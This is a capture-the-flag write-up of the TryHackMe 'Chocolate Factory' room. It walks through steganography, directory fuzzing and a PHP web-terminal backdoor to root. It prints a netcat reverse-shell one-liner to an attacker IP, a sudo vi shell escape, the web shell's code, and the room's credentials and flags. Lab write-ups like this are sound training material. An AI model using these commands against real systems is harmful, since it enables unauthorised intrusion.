@@ -1,0 +1,221 @@
+Chocolate Factory Penetration Test Report
+
+Platform: TryHackMe
+Room: Chocolate Factory
+Author: Sovren
+
+Executive Summary
+
+This report documents the security assessment of the Chocolate Factory TryHackMe room. The objective was to identify vulnerabilities, gain initial access, escalate privileges, and obtain the final flags. The assessment involved web enumeration, steganography, credential discovery, SSH access, privilege escalation via misconfigured sudo permissions, and decryption of protected content.
+
+Scope
+
+Target Host: Chocolate Factory VM
+
+Services in Scope: Web (HTTP), FTP, SSH
+
+Objective: Full system compromise (root access)
+
+=====================
+RECONNAISSANCE
+=====================
+
+Discovered a login page labeled “Squirrel Room”, suggesting credential-based access.
+
+The login form submits credentials via POST to validate.php, making it a potential for brute-force attacks (e.g., Hydra).
+
+Login Form Snippet:
+
+<form method="post" action="validate.php">
+  <input type="text" name="uname">
+  <input type="password" name="password">
+</form>
+
+The site uses PHP.
+
+Background images were downloaded via wget for offline inspection and potential steganographic analysis.
+
+=====================
+ENUMERATION
+=====================
+Nmap Scan Results
+
+The Nmap scan revealed an unusually large number of open ports:
+
+21/tcp – FTP (anonymous login enabled)
+
+22/tcp – SSH
+
+80/tcp – HTTP
+
+100–125/tcp – Multiple uncommon services listed as open (e.g., newacct, hostname, iso-tsap)
+
+A hint from Mr. Wonka suggested that these ports were a distraction:
+
+“Look somewhere else, it’s not here! Hope you won’t drown, Augustus.”
+
+This implied the attack surface was not related to these additional ports.
+
+Image & Steganography Analysis
+
+Images discovered and downloaded:
+
+gum_room.jpg
+
+wonka.jpg
+
+Steganography Attempts
+
+steghide failed initially due to missing passphrases.
+
+stegseek with rockyou.txt successfully extracted hidden data from gum_room.jpg.
+
+Result:
+
+Embedded file discovered but was not enumerated any further: b64.txt
+
+wonka.jpg also appeared to contain hidden data, but the passphrase was not found using rockyou.txt.
+
+Directory & Content Discovery
+
+Used ffuf to enumerate web paths:
+
+ffuf -u http://<target>/FUZZ -w admin-panels.txt
+
+Result:
+
+/home.php discovered
+
+This page provided a web-based command execution terminal
+
+User Enumeration
+
+Identified potential users:
+
+charlie
+
+ssm-user
+
+ubuntu
+
+=====================
+EXPLOITATION
+=====================
+Web Terminal Abuse
+
+The web terminal on home.php allowed arbitrary command execution.
+
+A reverse shell was obtained using:
+
+rm /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 1234 > /tmp/f
+
+Result:
+
+Initial shell access as www-data
+
+=====================
+PRIVILEGE ESCALATION
+=====================
+Credential Discovery
+
+Inspection of validate.php revealed hardcoded credentials:
+
+if($uname=="charlie" && $password=="cn7824")
+
+This confirmed valid credentials for user charlie.
+
+Key Discovery
+
+Found a binary/script (key_rev_key) that output a Fernet encryption key:
+
+b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
+
+Located SSH keys in /home/charlie/:
+
+teleport (private RSA key)
+
+teleport.pub
+
+SSH Access as Charlie
+
+Steps taken:
+
+Copied the private key from teleport
+
+Set proper permissions:
+
+chmod 600 id_rsa
+
+Connected via SSH:
+
+ssh -i id_rsa charlie@<target>
+
+Result:
+
+Successful login as charlie
+
+Retrieved user flag:
+
+flag{cd5509042371b34e4826e4838b522d2e}
+
+Sudo Privilege Escalation
+
+sudo -l output:
+
+(ALL : !root) NOPASSWD: /usr/bin/vi
+
+Using GTFOBins methodology:
+
+#sudo vi -c ':!/bin/sh' /dev/null
+
+Result:
+
+Root shell obtained
+
+Root-Level Decryption
+
+Located root.py, which decrypts an encrypted message using a Fernet key.
+
+Supplied the previously discovered key.
+
+Result:
+
+Final flag revealed:
+
+flag{cec59161d338fef787fcb4e296b42124}
+
+=====================
+POST-EXPLOITATION
+=====================
+Enumerated SUID binaries.
+
+No additional escalation paths were required beyond the misconfigured sudo permission.
+
+System fully compromised.
+
+=====================
+REPORTING & NOTES
+=====================
+Web Shell Backdoor
+
+home.php (disguised as home.jpg) contained a PHP command execution backdoor:
+
+if(isset($_POST['command'])) {
+    echo shell_exec($_POST['command']);
+}
+
+This explains the unrestricted web terminal functionality and represents a critical vulnerability.
+
+Conclusion
+
+The Chocolate Factory system was compromised through:
+
+Poor credential management
+
+Insecure web command execution
+
+Exposed private SSH keys
+
+Misconfigured sudo permissions
+
+This room effectively demonstrates common beginner-level vulnerabilities and privilege escalation techniques.
